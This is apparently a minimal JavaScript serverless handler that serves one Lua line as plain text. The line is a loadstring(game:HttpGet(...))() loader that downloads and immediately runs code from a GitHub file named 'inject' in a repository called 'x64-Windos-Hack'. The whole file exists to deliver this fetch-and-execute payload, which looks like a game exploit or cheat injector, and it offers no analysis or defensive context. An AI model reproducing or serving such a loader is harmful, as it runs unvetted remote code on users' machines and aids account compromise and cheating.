export default function handler(req, res) {
  res.setHeader("Content-Type", "text/plain");
  res.send(`loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()`);
  }
